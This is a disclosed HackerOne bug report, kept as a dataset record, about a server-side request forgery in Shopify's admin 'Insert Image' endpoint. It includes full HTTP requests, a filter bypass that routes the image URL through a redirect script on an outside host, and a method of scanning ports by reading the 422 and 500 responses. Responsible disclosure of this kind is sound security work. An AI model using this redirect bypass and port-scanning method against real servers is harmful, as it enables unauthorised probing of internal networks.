---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '67389'
original_report_id: '67389'
title: SSRF via 'Insert Image' feature of Products/Collections/Frontpage
weakness: Violation of Secure Design Principles
team_handle: shopify
created_at: '2015-06-11T09:05:59.151Z'
disclosed_at: '2015-08-24T14:47:13.085Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- violation-of-secure-design-principles
---

# SSRF via 'Insert Image' feature of Products/Collections/Frontpage

## Metadata

- HackerOne Report ID: 67389
- Weakness: Violation of Secure Design Principles
- Program: shopify
- Disclosed At: 2015-08-24T14:47:13.085Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Security team,

I would like to report an another SSRF issue like my previous [bug 67377] (https://hackerone.com/reports/67377). The description, threats, risks, exploatations are the same.

 The base request is the following
```
POST /admin/settings/files.json HTTP/1.1
Host: test-4925.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://test-4925.myshopify.com/admin/collections/63278595
Content-Length: 67
Cookie: COOKIES

src=SOME_URL
```
If `src` uses schemes that are not `http` or `https`, or the  another `port` then server responds with `HTTP/1.1 422 Unprocessable Entity`. At the same time we can bypass this filter using HTTP redirection trick below

```
POST /admin/settings/files.json HTTP/1.1
Host: test-4925.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://test-4925.myshopify.com/admin/collections/63278595
Content-Length: 67
Cookie: COOKIES

src=http%3A%2F%2Fhettoteam.tk/r.php?r=http://hettoteam.tk:21
```
If the server returns `HTTP/1.1 500 Internal Server Error` then the port is opened and if the server returns `HTTP/1.1 422 Unprocessable Entity` then the port is closed. 

Example of scanning ports for scanme.nmap.org host (TCP ports 1 - is closed, TCP port 22 - is opened):
`src=http%3A%2F%2Fhettoteam.tk/r.php?r=http://scanme.nmap.org:1`: HTTP code is 422.
`src=http%3A%2F%2Fhettoteam.tk/r.php?r=http://scanme.nmap.org:22`: HTTP code is 500 

The network dump is in attachment.

Cheers,
Denis.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
